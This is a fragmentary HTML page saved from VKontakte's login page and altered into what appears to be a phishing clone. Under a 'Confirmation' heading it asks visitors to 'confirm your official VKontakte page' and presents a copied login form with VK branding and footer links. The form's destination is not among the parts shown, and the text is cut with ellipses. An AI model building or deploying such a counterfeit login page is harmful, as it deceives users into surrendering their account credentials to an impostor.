...
<!-- saved from url=(0029)http://vkontakte.ru/login.php -->
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en" id="vkontakte"><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1251">
...
<ol id="nav">
  ...
  <li><a href="./index_files/index.html"></a></li>
...
<!-- pageBody -->
  ...
  <div id="wrapH">
  <div id="wrapHI">
   <div id="header"><h1>Подтверждение</h1></div>
  </div>
  </div>
...
var captcha_cancel = 'Отмена';
                                                                                                                                                                                                                                                               ...
                                                                                                                                                                                                                                                               Пожалуйста, подтвердите Вашу официальную страницу ВКонтакте:
 ...
 <input type="hidden" name="try_to_login" id="try_to_login" value="1">
  <table align="center" cellpadding=0 cellspacing=7 border=0 width="40%">
   ...
   <tr>
    ...
    <td>
     <input style="margin-top:1px; vertical-align: middle;" type="checkbox" name="expire" id="expire" value="1" />Чужой компьютер
    </td>
   </tr>
   <tr>
    <td>
...
<div class="footerVK">
 <div><a href="http://vkontakte.ru/help.php?page=about">В Контакте</a> © 2006-2015 <a href="http://vkontakte.ru/login.php#" onclick="return doChangeLang(0, &#39;570d06bbb940283fe1&#39;);" style="margin-left:7px">Русский</a><a href="http://vkontakte.ru/login.php#" onclick="return doChangeLang(1, &#39;570d06bbb940283fe1&#39;);" style="margin-left:7px"></a><a href="http://vkontakte.ru/login.php#" onclick="return doChangeLang(2, &#39;570d06bbb940283fe1&#39;);" style="margin-left:7px"></a><a href="http://vkontakte.ru/login.php#" onclick="return doChangeLang(3, &#39;570d06bbb940283fe1&#39;);" style="margin-left:7px"></a><a href="http://vkontakte.ru/login.php#" onclick="return doChangeLang(11, &#39;570d06bbb940283fe1&#39;);" style="margin-left:7px"></a><a href="http://vkontakte.ru/login.php#" onclick="return doChangeLang(10, &#39;570d06bbb940283fe1&#39;);" style="margin-left:7px"></a><a href="http://vkontakte.ru/login.php#" onclick="return doChangeLang(57, &#39;570d06bbb940283fe1&#39;);" style="margin-left:7px"></a><a href="http://vkontakte.ru/login.php#" onclick="return changeLang();" class="langSelector" »</a></div>
 <div><!----></div>
</div>
<!--Both counters-->
<script type="text/javascript">
